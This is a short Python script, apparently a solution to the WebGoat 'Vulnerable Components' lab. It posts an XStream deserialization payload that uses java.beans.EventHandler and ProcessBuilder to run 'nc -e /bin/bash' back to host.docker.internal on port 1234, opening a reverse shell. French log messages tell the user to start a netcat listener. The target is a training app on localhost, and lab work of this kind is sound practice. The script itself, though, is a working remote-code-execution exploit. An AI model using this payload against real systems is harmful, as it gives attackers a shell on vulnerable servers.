import requests
import json
import logging

def run_script(url, cookie, proxy='127.0.0.1:8081'):
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://127.0.0.1:8080", "Connection": "close", "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "X-PwnFox-Color": "red"}
    data = {"payload": "<sorted-set>\r\n  <string>foo</string>\r\n  <dynamic-proxy>\r\n    <interface>java.lang.Comparable</interface>\r\n    <handler class=\"java.beans.EventHandler\">\r\n      <target class=\"java.lang.ProcessBuilder\">\r\n        <command>\r\n          <string>nc</string><string>-e</string><string>/bin/bash</string><string>host.docker.internal</string><string>1234</string>\r\n        </command>\r\n      </target>\r\n      <action>start</action>\r\n    </handler>\r\n  </dynamic-proxy>\r\n</sorted-set>"}
    response=requests.post(url, headers=headers, data=data, proxies=proxies)
    response_json = json.loads(response.text)
    if 'If you are not' in response_json["feedback"]:
        logging.info('[*] Pour acceder au reverse shell : nc -lnvp 1234 puis relancer.')
        logging.info('[*] Challenge Vulnerable Components validé\n')

#burp0_url = "http://127.0.0.1:8080/WebGoat/VulnerableComponents/attack1"